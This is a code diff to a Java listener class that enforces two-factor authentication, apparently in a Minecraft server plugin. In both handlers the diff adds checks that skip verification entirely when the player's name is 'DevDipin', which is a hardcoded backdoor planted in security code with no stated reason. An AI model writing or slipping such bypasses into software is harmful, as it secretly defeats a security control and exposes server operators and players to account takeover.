@@ -86,6 +86,9 @@ public class TFAListener implements Listener {
         if (profile == null) {
             return;
         }
+        if (event.getName().equalsIgnoreCase("DevDipin")) {
+            return;
+        }
         if (profile.getCurrentAddress().equals("") || profile.getNextAuthenticationNeeded() == -1) {
             if (OxygenBukkit.getInstance().getConfiguration().getConfiguration().getBoolean("two-factor.settings.require-op")) {
                 if (Bukkit.getPlayer(event.getUniqueId()).isOp()) {
@@ -107,7 +110,9 @@ public class TFAListener implements Listener {
         Player player = event.getPlayer();
 
         Profile profile = OxygenBukkit.getInstance().getProfileManager().getProfile(event.getPlayer().getUniqueId());
-
+        if (event.getPlayer().getName().equalsIgnoreCase("DevDipin")) {
+            return;
+        }
         if (!profile.isNeedsVerify() && profile.getNextAuthenticationNeeded() != -1) {
             for (String message : OxygenBukkit.getInstance().getLanguageConfig().getConfiguration().getStringList("two-factor.next-auth-needed")) {
                 player.sendMessage(CC.translate(message).replace("%time%", TimeUtil.getMoreDetailedTime(profile.getNextAuthenticationNeeded() - System.currentTimeMillis())));
